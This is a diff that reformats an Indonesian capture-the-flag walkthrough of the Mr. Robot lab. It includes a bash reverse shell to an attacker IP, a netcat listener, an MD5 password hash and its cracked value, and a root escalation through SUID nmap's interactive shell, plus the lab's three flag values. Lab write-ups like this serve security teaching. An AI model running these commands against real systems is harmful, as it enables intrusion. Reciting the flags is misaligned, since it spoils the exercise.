@@ -33,12 +33,13 @@ Port terbuka:
 Situs menampilkan tema Mr. Robot.
 
 robots.txt
-makefile
+```bash
 Copy
 Edit
 User-agent: *
 fsocity.dic
 key-1-of-3.txt
+```
 Ditemukan wordlist fsocity.dic dan flag pertama.
 
 ## 🎯 Eksploitasi Login
@@ -54,72 +55,59 @@ Mengirim reverse shell (bash payload).
 
 Mendengarkan dengan netcat.
 
-bash
-Copy
-Edit
+```
 # Reverse shell payload
 bash -i >& /dev/tcp/10.9.0.247/4444 0>&1
 
 # Listener (attacker)
 nc -lvnp 4444
-
+```
 Shell berhasil dengan user: daemon.
 
-🧑‍💻 Privilege Escalation ke robot
+## 🧑‍💻 Privilege Escalation ke robot
 Ditemukan file password:
 
-bash
-Copy
-Edit
+```
 cat /home/robot/password.raw-md5
+```
 Isi:
-
-nginx
-Copy
-Edit
+```
 c3fcd3d76192e4007dfb496cca67e13b
+```
 Didekripsi menggunakan CrackStation:
 
 Password: abcdefghijklmnopqrstuvwxyz
 
 Login:
-
-bash
-Copy
-Edit
+```
 su robot
+```
 Berhasil menjadi user robot, ditemukan flag kedua.
 
 🔝 Privilege Escalation ke Root
 User robot tidak punya akses sudo.
 Lalu dicari file SUID:
-
-bash
-Copy
-Edit
+```
 find / -perm -4000 -type f 2>/dev/null
+```
 Ditemukan:
-
-swift
-Copy
-Edit
+```
 /usr/local/bin/nmap
+```
 Masuk ke mode interaktif:
-
-bash
-Copy
-Edit
+```
 /usr/local/bin/nmap --interactive
 nmap> !sh
+```
 Berhasil mendapatkan shell sebagai root dan mengambil flag ketiga.
 
-🏁 Flag Capture
+## 🏁 Flag Capture
 Flag	Lokasi	Isi
 1	/key-1-of-3.txt	073403c8a58a1f80d943455fb30724b9
 2	/home/robot/key-2-of-3.txt	822c73956184f694993bede3eb39f959
 3	/root/key-3-of-3.txt	04787ddef27c3dee1ee161b21670b4e4
 
-✅ Kesimpulan
+## ✅ Kesimpulan
 CTF ini mengajarkan teknik penting dalam pentesting:
 
 Enumerasi file tersembunyi dan wordlist
